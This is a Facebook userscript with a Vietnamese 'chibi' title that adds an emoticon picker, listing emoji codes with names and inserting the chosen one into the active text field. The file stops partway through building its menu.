// ==UserScript==
// @name            VẼ CHIBI MỚI NHẤT (y)
// @description     All about facebook By NoBITA
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// ==Icon==
(function() {
	// Active only in main frame
	if (!document.querySelector("#pageNav")) {
		return;
	}
	//console.info("Extra Facebook Smileys");

	// = Data =======
	var emoticons = [ { // Text to picture emoticons
"chars" : " :) ",
		"class" : "emoticon_smile",
		"name" : "Smiley"
	}, {
		"chars" : " :( ",
		"class" : "emoticon_frown",
		"name" : "Frown"
	}, {
		"chars" : " :P ",
		"class" : "emoticon_tongue",
		"name" : "Tongue"
	}, {
        "chars" : " :D ",
		"class" : "emoticon_grin",
		"name" : "Grin"
	}, {
		"chars" : " :o ",
		"class" : "emoticon_gasp",
		"name" : "Gasp"
	}, {
		"chars" : " ;) ",
		"class" : "emoticon_wink",
		"name" : "Wink"
	}, {
		"chars" : " :v ",
		"class" : "emoticon_pacman",
		"name" : "Pacman"
	}, {
		"chars" : " >:( ",
		"class" : "emoticon_grumpy",
		"name" : "Gru?ƒÂ±?ƒÂ³n"
	}, {
		"chars" : " :/ ",
		"class" : "emoticon_unsure",
		"name" : "Unsure"
	}, {
		"chars" : " :'( ",
		"class" : "emoticon_cry",
		"name" : "Cry"
	}, {
		"chars" : " ^_^ ",
		"class" : "emoticon_kiki",
		"name" : "Kiki"
	}, {
		"chars" : " 8) ",
		"class" : "emoticon_glasses",
		"name" : "Glasses"
	}, {
		"chars" : " B| ",
		"class" : "emoticon_sunglasses",
		"name" : "Sunglasses"
	}, {
		"chars" : " <3 ",
		"class" : "emoticon_heart",
		"name" : "Heart"
	}, {
		"chars" : " 3:) ",
		"class" : "emoticon_devil",
		"name" : "Devil"
	}, {
		"chars" : " O:) ",
		"class" : "emoticon_angel",
		"name" : "Angel"
	}, {
		"chars" : " -_- ",
		"class" : "emoticon_squint",
		"name" : "Squint"
	}, {
		"chars" : " o.O ",
		"class" : "emoticon_confused",
		"name" : "Confused"
	}, {
		"chars" : " >:o ",
		"class" : "emoticon_upset",
		"name" : "Upset"
	}, {
		"chars" : " :3 ",
		"class" : "emoticon_colonthree",
		"name" : "Colonthree"
	}, {
		"chars" : " (y) ",
		"class" : "emoticon_like",
		"name" : "Like"
	}, {
		"chars" : " :* ",
		"class" : "emoticon emoticon_kiss",
		"name" : "Kiss"
	}, {
		"chars" : " (^^^) ",
		"class" : "emoticon_shark",
		"name" : "Shark"
	}, {
		"chars" : " :|] ",
		"class" : "emoticon_robot",
		"name" : "Robot"
	}, {
		"chars" : " <(\") ",
		"class" : "emoticon_penguin",
		"name" : "Ping?ƒÂ¼ino"
	}, {
		"chars" : " :poop: ",
		"class" : "emoticon_poop",
		"name" : "Poop"
        }, {
		"chars" : " :putnam: ",
		"class" : "emoticon_putnam",
		"name" : "Putman"
	}, {
		"chars" : " \ud83c\udf02 ",
		"class" : "_1az _1a- _2c0",
		"name" : "Pink Umbrella"
	}, {
		"chars" : " \ud83c\udf0a ",
		"class" : "_1az _1a- _2c1",
		"name" : "Sea Wave"
	}, {
		"chars" : " \ud83c\udf19 ",
		"class" : "_1az _1a- _2c2",
		"name" : "Crescent moon"
	}, {
		"chars" : " \ud83c\udf1f ",
		"class" : "_1az _1a- _2c3",
		"name" : "Bright Star"
	}, {
		"chars" : " \ud83c\udf31 ",
		"class" : "_1az _1a- _2c4",
		"name" : "Seedbed"
	}, {
		"chars" : " \ud83c\udf34 ",
		"class" : "_1az _1a- _2c5",
		"name" : "Single Palm Tree"
	}, {
		"chars" : " \ud83c\udf35 ",
		"class" : "_1az _1a- _2c6",
		"name" : "Cactus"
	}, {
		"chars" : " \ud83c\udf37 ",
		"class" : "_1az _1a- _2c7",
		"name" : "Tulip"
	}, {
		"chars" : " \ud83c\udf38 ",
		"class" : "_1az _1a- _2c8",
		"name" : "Cherry Blossom"
	}, {
		"chars" : " \ud83c\udf39 ",
		"class" : "_1az _1a- _2c9",
		"name" : "Rose"
	}, {
		"chars" : " \ud83c\udf3a ",
		"class" : "_1az _1a- _2ca",
		"name" : "Cayenne"
	}, {
		"chars" : " \ud83c\udf3b ",
		"class" : "_1az _1a- _2cb",
		"name" : "Sunflower"
	}, {
		"chars" : " \ud83c\udf3e ",
		"class" : "_1az _1a- _2cc",
		"name" : "Ear Of Rice"
	}, {
		"chars" : " \ud83c\udf40 ",
		"class" : "_1az _1a- _2cd",
		"name" : "Four Leaf Clover"
	}, {
		"chars" : " \ud83c\udf41 ",
		"class" : "_1az _1a- _2ce",
		"name" : "Maple Leaf"
	}, {
		"chars" : " \ud83c\udf42 ",
		"class" : "_1az _1a- _2cf",
		"name" : "Fallen Leaf"
	}, {
		"chars" : " \ud83c\udf43 ",
		"class" : "_1az _1a- _2cg",
		"name" : "Leaf Floating In The Wind"
	}, {
		"chars" : " \ud83c\udf4a ",
		"class" : "_1az _1a- _2ch",
		"name" : "Tangerine"
	}, {
		"chars" : " \ud83c\udf4e ",
		"class" : "_1az _1a- _2ci",
		"name" : "Red Apple"
	}, {
		"chars" : " \ud83c\udf53 ",
		"class" : "_1az _1a- _2cj",
		"name" : "Strawberry"
	}, {
		"chars" : " \ud83c\udf54 ",
		"class" : "_1az _1a- _2ck",
		"name" : "Burger"
	}, {
		"chars" : " \ud83c\udf78 ",
		"class" : "_1az _1a- _2cl",
		"name" : "Cocktail Glass"
	}, {
		"chars" : " \ud83c\udf7a ",
		"class" : "_1az _1a- _2cm",
		"name" : "Tankard"
	}, {
		"chars" : " \ud83c\udf81 ",
		"class" : "_1az _1a- _2cn",
		"name" : "Gift Wrapped"
	}, {
		"chars" : " \ud83c\udf83 ",
		"class" : "_1az _1a- _2co",
		"name" : "Pumpkin With Candle"
	}, {
		"chars" : " \ud83c\udf84 ",
		"class" : "_1az _1a- _2cp",
		"name" : "Christmas Tree"
	}, {
		"chars" : " \ud83c\udf85 ",
		"class" : "_1az _1a- _2cq",
		"name" : "Santa"
	}, {
		"chars" : " \ud83c\udf88 ",
		"class" : "_1az _1a- _2cr",
		"name" : "Balloon"
	}, {
		"chars" : " \ud83c\udf89 ",
		"class" : "_1az _1a- _2cs",
		"name" : "Party Popper"
	}, {
		"chars" : " \ud83c\udf8d ",
		"class" : "_1az _1a- _2ct",
		"name" : "Pine Decor"
	}, {
		"chars" : " \ud83c\udf8e ",
		"class" : "_1az _1a- _2cu",
		"name" : "Japanese Dolls"
	}, {
		"chars" : " \ud83c\udf8f ",
		"class" : "_1az _1a- _2cv",
		"name" : "Carp Streamer"
	}, {
		"chars" : " \ud83c\udf90 ",
		"class" : "_1az _1a- _2cw",
		"name" : "Wind Chime"
	}, {
		"chars" : " \ud83c\udf93 ",
		"class" : "_1az _1a- _2cx",
		"name" : "Graduation Cap"
	}, {
		"chars" : " \ud83c\udfb5 ",
		"class" : "_1az _1a- _2cy",
		"name" : "Musical Note"
	}, {
		"chars" : " \ud83c\udfb6 ",
		"class" : "_1az _1a- _2cz",
		"name" : "Multiple Musical Notes"
	}, {
		"chars" : " \ud83c\udfbc ",
		"class" : "_1az _1a- _2c-",
		"name" : "Musical Score"
	}, {
		"chars" : " \ud83d\udc0d ",
		"class" : "_1az _1a- _2c_",
		"name" : "Snake"
	}, {
		"chars" : " \ud83d\udc0e ",
		"class" : "_1az _1a- _2d0",
		"name" : "Horse"
	}, {
		"chars" : " \ud83d\udc11 ",
		"class" : "_1az _1a- _2d1",
		"name" : "Sheep"
	}, {
		"chars" : " \ud83d\udc12 ",
		"class" : "_1az _1a- _2d2",
		"name" : "Monkey"
	}, {
		"chars" : " \ud83d\udc14 ",
		"class" : "_1az _1a- _2d3",
		"name" : "Hen"
	}, {
		"chars" : " \ud83d\udc17 ",
		"class" : "_1az _1a- _2d4",
		"name" : "Wild Boar"
	}, {
		"chars" : " \ud83d\udc18 ",
		"class" : "_1az _1a- _2d5",
		"name" : "Elephant"
	}, {
		"chars" : " \ud83d\udc19 ",
		"class" : "_1az _1a- _2d6",
		"name" : "Octopus"
	}, {
		"chars" : " \ud83d\udc1a ",
		"class" : "_1az _1a- _2d7",
		"name" : "Snail Shell"
	}, {
		"chars" : " \ud83d\udc1b ",
		"class" : "_1az _1a- _2d8",
		"name" : "Insect"
	}, {
		"chars" : " \ud83d\udc1f ",
		"class" : "_1az _1a- _2d9",
		"name" : "Fish"
	}, {
		"chars" : " \ud83d\udc20 ",
		"class" : "_1az _1a- _2da",
		"name" : "Tropical Fish"
	}, {
		"chars" : " \ud83d\udc21 ",
		"class" : "_1az _1a- _2db",
		"name" : "Pufferfish"
	}, {
		"chars" : " \ud83d\udc25 ",
		"class" : "_1az _1a- _2dc",
		"name" : "Chick In Front"
	}, {
		"chars" : " \ud83d\udc26 ",
		"class" : "_1az _1a- _2dd",
		"name" : "Bird"
	}, {
		"chars" : " \ud83d\udc27 ",
		"class" : "_1az _1a- _2de",
		"name" : "Penguin"
	}, {
		"chars" : " \ud83d\udc28 ",
		"class" : "_1az _1a- _2df",
		"name" : "Koala"
	}, {
		"chars" : " \ud83d\udc29 ",
		"class" : "_1az _1a- _2dg",
		"name" : "Poodle"
	}, {
		"chars" : " \ud83d\udc2b ",
		"class" : "_1az _1a- _2dh",
		"name" : "Bactrian Camel"
	}, {
		"chars" : " \ud83d\udc2c ",
		"class" : "_1az _1a- _2di",
		"name" : "Dolphin"
	}, {
		"chars" : " \ud83d\udc2d ",
		"class" : "_1az _1a- _2dj",
		"name" : "Mouse Face"
	}, {
		"chars" : " \ud83d\udc2e ",
		"class" : "_1az _1a- _2dk",
		"name" : "Cow Face"
	}, {
		"chars" : " \ud83d\udc2f ",
		"class" : "_1az _1a- _2dl",
		"name" : "Cara de tigre"
	}, {
		"chars" : " \ud83d\udc30 ",
		"class" : "_1az _1a- _2dm",
		"name" : "Rabbit Face"
	}, {
		"chars" : " \ud83d\udc31 ",
		"class" : "_1az _1a- _2dn",
		"name" : "Cat Face"
	}, {
		"chars" : " \ud83d\udc33 ",
		"class" : "_1az _1a- _2do",
		"name" : "Whale Sputtering"
	}, {
		"chars" : " \ud83d\udc34 ",
		"class" : "_1az _1a- _2dp",
		"name" : "Horse Face"
	}, {
		"chars" : " \ud83d\udc35 ",
		"class" : "_1az _1a- _2dq",
		"name" : "Monkey Face"
	}, {
		"chars" : " \ud83d\udc37 ",
		"class" : "_1az _1a- _2dr",
		"name" : "Pig face"
	}, {
		"chars" : " \ud83d\udc38 ",
		"class" : "_1az _1a- _2ds",
		"name" : "Frog Face"
	}, {
		"chars" : " \ud83d\udc39 ",
		"class" : "_1az _1a- _2dt",
		"name" : "Hamster Face"
	}, {
		"chars" : " \ud83d\udc3a ",
		"class" : "_1az _1a- _2du",
		"name" : "Wolf Face"
	}, {
		"chars" : " \ud83d\udc3b ",
		"class" : "_1az _1a- _2dv",
		"name" : "Bear Face"
	}, {
		"chars" : " \ud83d\udc3e ",
		"class" : "_1az _1a- _2dw",
		"name" : "Footprints"
	}, {
		"chars" : " \ud83d\udc40 ",
		"class" : "_1az _1a- _2dx",
		"name" : "Eyes"
	}, {
		"chars" : " \ud83d\udc42 ",
		"class" : "_1az _1a- _2dy",
		"name" : "Ear"
	}, {
		"chars" : " \ud83d\udc43 ",
		"class" : "_1az _1a- _2dz",
		"name" : "Nose"
	}, {
		"chars" : " \ud83d\udc44 ",
		"class" : "_1az _1a- _2d-",
		"name" : "Mouth"
	}, {
		"chars" : " \ud83d\udc45 ",
		"class" : "_1az _1a- _2d_",
		"name" : "Sour Face"
	}, {
		"chars" : " \ud83d\udc46 ",
		"class" : "_1az _1a- _2e0",
		"name" : "White hand pointing up"
	}, {
		"chars" : " \ud83d\udc47 ",
		"class" : "_1az _1a- _2e1",
		"name" : "White hand faces downward"
	}, {
		"chars" : " \ud83d\udc48 ",
		"class" : "_1az _1a- _2e2",
		"name" : "White hand indicating left"
	}, {
		"chars" : " \ud83d\udc49 ",
		"class" : "_1az _1a- _2e3",
		"name" : "White hand indicating right"
	}, {
		"chars" : " \ud83d\udc4a ",
		"class" : "_1az _1a- _2e4",
		"name" : "Fist"
	}, {
		"chars" : " \ud83d\udc4b ",
		"class" : "_1az _1a- _2e5",
		"name" : "Hand in motion"
	}, {
		"chars" : " \ud83d\udc4c ",
		"class" : "_1az _1a- _2e6",
		"name" : "Hand showing all good"
	}, {
		"chars" : " \ud83d\udc4d ",
		"class" : "_1az _1a- _2e7",
		"name" : "Hand with thumb up"
	}, {
		"chars" : " \ud83d\udc4e ",
		"class" : "_1az _1a- _2e8",
		"name" : "Hand with thumb down"
	}, {
		"chars" : " \ud83d\udc4f ",
		"class" : "_1az _1a- _2e9",
		"name" : "Hands clapping"
	}, {
		"chars" : " \ud83d\udc50 ",
		"class" : "_1az _1a- _2ea",
		"name" : "Open Hands"
	}, {
		"chars" : " \ud83d\udc66 ",
		"class" : "_1az _1a- _2eb",
		"name" : "Boy"
	}, {
		"chars" : " \ud83d\udc67 ",
		"class" : "_1az _1a- _2ec",
		"name" : "Girl"
	}, {
		"chars" : " \ud83d\udc68 ",
		"class" : "_1az _1a- _2ed",
		"name" : "Man"
	}, {
		"chars" : " \ud83d\udc69 ",
		"class" : "_1az _1a- _2ee",
		"name" : "Woman"
	}, {
		"chars" : " \ud83d\udc6b ",
		"class" : "_1az _1a- _2ef",
		"name" : "Man and woman holding hands"
	}, {
		"chars" : " \ud83d\udc6e ",
		"class" : "_1az _1a- _2eg",
		"name" : "Police Officer"
	}, {
		"chars" : " \ud83d\udc6f ",
		"class" : "_1az _1a- _2eh",
		"name" : "Woman with bunny ears"
	}, {
		"chars" : " \ud83d\udc71 ",
		"class" : "_1az _1a- _2ei",
		"name" : "Person with hair rubio"
	}, {
		"chars" : " \ud83d\udc72 ",
		"class" : "_1az _1a- _2ej",
		"name" : "Man with pi mao gua"
	}, {
		"chars" : " \ud83d\udc73 ",
		"class" : "_1az _1a- _2ek",
		"name" : "Man with turban"
	}, {
		"chars" : " \ud83d\udc74 ",
		"class" : "_1az _1a- _2el",
		"name" : "Old Man"
	}, {
		"chars" : " \ud83d\udc75 ",
		"class" : "_1az _1a- _2em",
		"name" : "Old Woman"
	}, {
		"chars" : " \ud83d\udc76 ",
		"class" : "_1az _1a- _2en",
		"name" : "Baby"
	}, {
		"chars" : " \ud83d\udc77 ",
		"class" : "_1az _1a- _2eo",
		"name" : "Construction Worker"
	}, {
		"chars" : " \ud83d\udc78 ",
		"class" : "_1az _1a- _2ep",
		"name" : "Princess"
	}, {
		"chars" : " \ud83d\udc7b ",
		"class" : "_1az _1a- _2eq",
		"name" : "Ghost"
	}, {
		"chars" : " \ud83d\udc7c ",
		"class" : "_1az _1a- _2er",
		"name" : "Angel baby"
	}, {
		"chars" : " \ud83d\udc7d ",
		"class" : "_1az _1a- _2es",
		"name" : "Alien"
	}, {
		"chars" : " \ud83d\udc7e ",
		"class" : "_1az _1a- _2et",
		"name" : "Alien Monster"
	}, {
		"chars" : " \ud83d\udc7f ",
		"class" : "_1az _1a- _2eu",
		"name" : "Imp"
	}, {
		"chars" : " \ud83d\udc80 ",
		"class" : "_1az _1a- _2ev",
		"name" : "Skull"
	}, {
		"chars" : " \ud83d\udc82 ",
		"class" : "_1az _1a- _2ew",
		"name" : "Guard"
	}, {
		"chars" : " \ud83d\udc83 ",
		"class" : "_1az _1a- _2ex",
		"name" : "Ballerina"
	}, {
		"chars" : " \ud83d\udc85 ",
		"class" : "_1az _1a- _2ey",
		"name" : "Nail Polish"
	}, {
		"chars" : " \ud83d\udc8b ",
		"class" : "_1az _1a- _2ez",
		"name" : "Brand of kiss"
	}, {
		"chars" : " \ud83d\udc8f ",
		"class" : "_1az _1a- _2e-",
		"name" : "Kissing couple"
	}, {
		"chars" : " \ud83d\udc90 ",
		"class" : "_1az _1a- _2e_",
		"name" : "Bunch of flowers"
	}, {
		"chars" : " \ud83d\udc91 ",
		"class" : "_1az _1a- _2f0",
		"name" : "Couple with heart"
	}, {
		"chars" : " \ud83d\udc93 ",
		"class" : "_1az _1a- _2f1",
		"name" : "Heart beating"
	}, {
		"chars" : " \ud83d\udc94 ",
		"class" : "_1az _1a- _2f2",
		"name" : "Broken Heart"
	}, {
		"chars" : " \ud83d\udc96 ",
		"class" : "_1az _1a- _2f3",
		"name" : "Bright Heart"
	}, {
		"chars" : " \ud83d\udc97 ",
		"class" : "_1az _1a- _2f4",
		"name" : "Heart growing"
	}, {
		"chars" : " \ud83d\udc98 ",
		"class" : "_1az _1a- _2f5",
		"name" : "Heart with arrow"
	}, {
		"chars" : " \ud83d\udc99 ",
		"class" : "_1az _1a- _2f6",
		"name" : "Blue Heart"
	}, {
		"chars" : " \ud83d\udc9a ",
		"class" : "_1az _1a- _2f7",
		"name" : "Green Heart"
	}, {
		"chars" : " \ud83d\udc9b ",
		"class" : "_1az _1a- _2f8",
		"name" : "Yellow Heart"
	}, {
		"chars" : " \ud83d\udc9c ",
		"class" : "_1az _1a- _2f9",
		"name" : "Purple Heart"
	}, {
		"chars" : " \ud83d\udc9d ",
		"class" : "_1az _1a- _2fa",
		"name" : "Heart with ribbon"
	}, {
		"chars" : " \ud83d\udca2 ",
		"class" : "_1az _1a- _2fb",
		"name" : "Symbol of anger"
	}, {
		"chars" : " \ud83d\udca4 ",
		"class" : "_1az _1a- _2fc",
		"name" : "Sleeping"
	}, {
		"chars" : " \ud83d\udca6 ",
		"class" : "_1az _1a- _2fd",
		"name" : "Sweat Symbol"
	}, {
		"chars" : " \ud83d\udca8 ",
		"class" : "_1az _1a- _2fe",
		"name" : "Quick Start Symbol"
	}, {
		"chars" : " \ud83d\udca9 ",
		"class" : "_1az _1a- _2ff",
		"name" : "Pile of Caca"
	}, {
		"chars" : " \ud83d\udcaa ",
		"class" : "_1az _1a- _2fg",
		"name" : "Flexed bicep"
	}, {
		"chars" : " \ud83d\udcbb ",
		"class" : "_1az _1a- _2fh",
		"name" : "Personal Computer"
	}, {
		"chars" : " \ud83d\udcbd ",
		"class" : "_1az _1a- _2fi",
		"name" : "Mini Disco"
	}, {
		"chars" : " \ud83d\udcbe ",
		"class" : "_1az _1a- _2fj",
		"name" : "Floppy disk"
	}, {
		"chars" : " \ud83d\udcbf ",
		"class" : "_1az _1a- _2fk",
		"name" : "Optical Disc"
	}, {
		"chars" : " \ud83d\udcc0 ",
		"class" : "_1az _1a- _2fl",
		"name" : "DVD"
	}, {
		"chars" : " \ud83d\udcde ",
		"class" : "_1az _1a- _2fm",
		"name" : "Telephone receiver"
	}, {
		"chars" : " \ud83d\udce0 ",
		"class" : "_1az _1a- _2fn",
		"name" : "Fax"
	}, {
		"chars" : " \ud83d\udcf1 ",
		"class" : "_1az _1a- _2fo",
		"name" : "Mobile Phone"
	}, {
		"chars" : " \ud83d\udcf2 ",
		"class" : "_1az _1a- _2fp",
		"name" : "Mobile phone with arrow from left to right"
	}, {
		"chars" : " \ud83d\udcfa ",
		"class" : "_1az _1a- _2fq",
		"name" : "Television"
	}, {
		"chars" : " \ud83d\udd14 ",
		"class" : "_1az _1a- _2fr",
		"name" : "Bell"
	}, {
		"chars" : " \ud83d\ude01 ",
		"class" : "_1az _1a- _2fs",
		"name" : "Face to face with smiling eyes"
	}, {
		"chars" : " \ud83d\ude02 ",
		"class" : "_1az _1a- _2ft",
		"name" : "Face with tears of joy"
	}, {
		"chars" : " \ud83d\ude03 ",
		"class" : "_1az _1a- _2fu",
		"name" : "Smiley face with open mouth"
	}, {
		"chars" : " \ud83d\ude04 ",
		"class" : "_1az _1a- _2fv",
		"name" : "Face and eyes smiling with mouth open"
	}, {
		"chars" : " \ud83d\ude06 ",
		"class" : "_1az _1a- _2fw",
		"name" : "Smiley face with mouth open and eyes closed"
	}, {
		"chars" : " \ud83d\ude09 ",
		"class" : "_1az _1a- _2fx",
		"name" : "Face winking eye"
	}, {
		"chars" : " \ud83d\ude0b ",
		"class" : "_1az _1a- _2fy",
		"name" : "Guy savoring delicious food"
	}, {
		"chars" : " \ud83d\ude0c ",
		"class" : "_1az _1a- _2fz",
		"name" : "Relief face"
	}, {
		"chars" : " \ud83d\ude0d ",
		"class" : "_1az _1a- _2f-",
		"name" : "Smiley face with heart shaped eyes"
	}, {
		"chars" : " \ud83d\ude0f ",
		"class" : "_1az _1a- _2f_",
		"name" : "Smirk face"
	}, {
		"chars" : " \ud83d\ude12 ",
		"class" : "_1az _1a- _2g0",
		"name" : "Face of boredom"
	}, {
		"chars" : " \ud83d\ude13 ",
		"class" : "_1az _1a- _2g1",
		"name" : "Face with cold sweat"
	}, {
		"chars" : " \ud83d\ude14 ",
		"class" : "_1az _1a- _2g2",
		"name" : "Pensive face"
	}, {
		"chars" : " \ud83d\ude16 ",
		"class" : "_1az _1a- _2g3",
		"name" : "Confused face"
	}, {
		"chars" : " \ud83d\ude18 ",
		"class" : "_1az _1a- _2g4",
		"name" : "Throwing kiss Face"
	}, {
		"chars" : " \ud83d\ude1a ",
		"class" : "_1az _1a- _2g5",
		"name" : "Kissing face with eyes closed"
	}, {
		"chars" : " \ud83d\ude1c ",
		"class" : "_1az _1a- _2g6",
		"name" : "Face with tongue out and winking"
	}, {
		"chars" : " \ud83d\ude1d ",
		"class" : "_1az _1a- _2g7",
		"name" : "Face with tongue hanging out and eyes closed"
	}, {
		"chars" : " \ud83d\ude1e ",
		"class" : "_1az _1a- _2g8",
		"name" : "Face discouraged"
	}, {
		"chars" : " \ud83d\ude20 ",
		"class" : "_1az _1a- _2g9",
		"name" : "Face of anger"
	}, {
		"chars" : " \ud83d\ude21 ",
		"class" : "_1az _1a- _2ga",
		"name" : "Very angry face"
	}, {
		"chars" : " \ud83d\ude22 ",
		"class" : "_1az _1a- _2gb",
		"name" : "Crying Face"
	}, {
		"chars" : " \ud83d\ude23 ",
		"class" : "_1az _1a- _2gc",
		"name" : "Face of perseverance"
	}, {
		"chars" : " \ud83d\ude24 ",
		"class" : "_1az _1a- _2gd",
		"name" : "Face of triumph"
	}, {
		"chars" : " \ud83d\ude25 ",
		"class" : "_1az _1a- _2ge",
		"name" : "Face discouraged but relieved"
	}, {
		"chars" : " \ud83d\ude28 ",
		"class" : "_1az _1a- _2gf",
		"name" : "Scary face"
	}, {
		"chars" : " \ud83d\ude29 ",
		"class" : "_1az _1a- _2gg",
		"name" : "Fatigued face"
	}, {
		"chars" : " \ud83d\ude2a ",
		"class" : "_1az _1a- _2gh",
		"name" : "Sleeping face"
	}, {
		"chars" : " \ud83d\ude2b ",
		"class" : "_1az _1a- _2gi",
		"name" : "Tired face"
	}, {
		"chars" : " \ud83d\ude2d ",
		"class" : "_1az _1a- _2gj",
		"name" : "Face screaming"
	}, {
		"chars" : " \ud83d\ude30 ",
		"class" : "_1az _1a- _2gk",
		"name" : "Face with mouth open and cold sweat"
	}, {
		"chars" : " \ud83d\ude31 ",
		"class" : "_1az _1a- _2gl",
		"name" : "Terrified face of fear"
	}, {
		"chars" : " \ud83d\ude32 ",
		"class" : "_1az _1a- _2gm",
		"name" : "Very surprised face"
	}, {
		"chars" : " \ud83d\ude33 ",
		"class" : "_1az _1a- _2gn",
		"name" : "Face flushed"
	}, {
		"chars" : " \ud83d\ude35 ",
		"class" : "_1az _1a- _2go",
		"name" : "Face dizzy"
	}, {
		"chars" : " \ud83d\ude37 ",
		"class" : "_1az _1a- _2gp",
		"name" : "Face with medical mask"
	}, {
		"chars" : " \ud83d\ude38 ",
		"class" : "_1az _1a- _2gq",
		"name" : "Grinning Cat face and eyes closed"
	}, {
		"chars" : " \ud83d\ude39 ",
		"class" : "_1az _1a- _2gr",
		"name" : "Cat face with tears of laughter"
	}, {
		"chars" : " \ud83d\ude3a ",
		"class" : "_1az _1a- _2gs",
		"name" : "Smiling cat face with open mouth"
	}, {
		"chars" : " \ud83d\ude3b ",
		"class" : "_1az _1a- _2gt",
		"name" : "Smiling cat face with hearts in her eyes"
	}, {
		"chars" : " \ud83d\ude3c ",
		"class" : "_1az _1a- _2gu",
		"name" : "Face of cat smile twisted"
	}, {
		"chars" : " \ud83d\ude3d ",
		"class" : "_1az _1a- _2gv",
		"name" : "Cat face kissing with eyes closed"
	}, {
		"chars" : " \ud83d\ude3f ",
		"class" : "_1az _1a- _2gw",
		"name" : "Cat face crying"
	}, {
		"chars" : " \ud83d\ude40 ",
		"class" : "_1az _1a- _2gx",
		"name" : "Cat face scared terrified"
	}, {
		"chars" : " \ud83d\ude4b ",
		"class" : "_1az _1a- _2gy",
		"name" : "Happy person raising a hand"
	}, {
		"chars" : " \ud83d\ude4c ",
		"class" : "_1az _1a- _2gz",
		"name" : "Person holding up both hands in celebration"
	}, {
		"chars" : " \ud83d\ude4d ",
		"class" : "_1az _1a- _2g-",
		"name" : "Person frowning"
	}, {
		"chars" : " \ud83d\ude4f ",
		"class" : "_1az _1a- _2g_",
		"name" : "Person in prayer"
	}, {
		"chars" : " \u261d ",
		"class" : "_1az _1a- _2h0",
		"name" : "Index finger pointing up"
	}, {
		"chars" : " \u263a ",
		"class" : "_1az _1a- _2h1",
		"name" : "White face smiling"
	}, {
		"chars" : " \u26a1 ",
		"class" : "_1az _1a- _2h2",
		"name" : "High voltage symbol"
	}, {
		"chars" : " \u26c4 ",
		"class" : "_1az _1a- _2h3",
		"name" : "Snowless snowman"
	}, {
		"chars" : " \u270a ",
		"class" : "_1az _1a- _2h4",
		"name" : "Fist up"
	}, {
		"chars" : " \u270b ",
		"class" : "_1az _1a- _2h5",
		"name" : "Hand pointing up"
	}, {
		"chars" : " \u270c ",
		"class" : "_1az _1a- _2h6",
		"name" : "Winning Hand"
	}, {
		"chars" : " \u2600 ",
		"class" : "_1az _1a- _2h7",
		"name" : "Sun With Rays"
	}, {
		"chars" : " \u2601 ",
		"class" : "_1az _1a- _2h8",
		"name" : "Cloud"
	}, {
		"chars" : " \u2614 ",
		"class" : "_1az _1a- _2h9",
		"name" : "Umbrella With Rain Drops"
	}, {
		"chars" : " \u2615 ",
		"class" : "_1az _1a- _2ha",
		"name" : "Hot Drink"
	}, {
		"chars" : " \u2728 ",
		"class" : "_1az _1a- _2hb",
		"name" : "Brightness"
	}, {
		"chars" : " \u2764 ",
		"class" : "_1az _1a- _2hc",
		"name" : "Heavy Black Heart"
	} ];

	// = Variables =======
	var lastActiveElement = document.activeElement;

	// = Functions =======
	function createElement(html) {
		var outerHTML = document.createElement("div");
		outerHTML.innerHTML = html;
		return outerHTML.firstChild;
	}

	function htmlSpecialChars(string) {
		var div = document.createElement("div");
		var text = document.createTextNode(string);
		div.appendChild(text);
		return div.innerHTML;
	}

	function isInstanceOfTextInput(element) {
		return (element instanceof HTMLInputElement && element.type == "text")
				|| element instanceof HTMLTextAreaElement;
	}

	function isFlyoutOpen(flyout) {
		return flyout.className == "openToggler";
	}

	function openFlyout(flyout, open) {
		if (open === undefined) {
			open = !isFlyoutOpen(flyout); // Toggle
		}

		if (open) {
			flyout.className = "openToggler";
		} else {
			flyout.removeAttribute("class");
		}
	}

	function createTab(titleContainer, bodyContainer) {
		var html;
		// Tab; default = inactive
	    html = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';
		html += '<div class="jewelFlyout">';
		html += '</div>';
		html += '</li>';
		var title = createElement(html);
		titleContainer.appendChild(title);

		// Manual input
		html = '<div style="display: none;">';
		html += '</div>';
		var body = createElement(html);
		bodyContainer.appendChild(body);

		// Change tab listener
		(function(body) {
			title.addEventListener("click", function() {
				// Change tab
				var titles = this.parentNode.childNodes; // tab.tabContainer.childNodes
				for ( var t = 0; t < titles.length; t++) {
					if (titles[t] === this) { // Active
						
					} else { // Inactive
						titles[t].style.background = "";
						titles[t].firstChild.style.color = "";
					}
				}

				// Change body
				var bodies = body.parentNode.childNodes; // body.bodyContainer.childNodes
				for ( var b = 0; b < bodies.length; b++) {
					if (bodies[b] === body) { // Show
						body.style.display = "";
					} else { // Hide
						bodies[b].style.display = "none";
					}
				}
			});
		})(body);

		return {
			"title" : title.firstChild,
			"body" : body
		};
	}

	function createTabListBody(emoticons, filter) {
		var html;

		html = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';
		html += '<div style="padding: 10px; width: 200px; font-size: 15px;">';
		html += '</div>';
		html += '</div>';
		var body = createElement(html).firstChild;
		for ( var e = 0; e < emoticons.length; e++) {
			var emoticon = emoticons[e];
			if (!filter(emoticon)) {
				continue;
			}

			// Icons
			html = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';
			html += '<a';
			html += ' class="emoticon'
					+ (emoticon.class !== undefined ? ' ' + emoticon.class : '')
					+ '"';
			html += ' style="text-decoration: inherit; color: inherit;'
					+ (emoticon.class !== undefined ? ' color: transparent;'
							: ' width: auto;') + '"';
			html += (emoticon.name !== undefined ? ' title="' + emoticon.name
					+ '"' : '');
			html += '>';
			html += htmlSpecialChars(emoticon.chars);
			html += '</a>';
			html += '</span>';
			var cell = createElement(html);
			body.appendChild(cell);

			// Select emoticon listener
			var emoticonA = cell.firstChild;
			(function(emoticon) {
				emoticonA.addEventListener("click", function() {
					if (isInstanceOfTextInput(lastActiveElement)) {
						lastActiveElement.focus();

						var chars = emoticon.chars;
						var value = lastActiveElement.value;
						var start = lastActiveElement.selectionStart;
						var end = lastActiveElement.selectionEnd;
						lastActiveElement.value = value.substring(0, start)
								+ chars + value.substring(end);
						lastActiveElement.setSelectionRange(start + chars.length, start + chars.length);
					}

					openFlyoutCommand = false; // Close flyout
				});
			})(emoticon);
		}

		return body.parentNode;
	}

	// = Construct UI =======
	var html;

	// Menu item
	// var navItem
	html = '<li class="navItem middleItem notifNegativeBase">';
	html += '<div class="fbJewel">';
	// {

	// Toggler
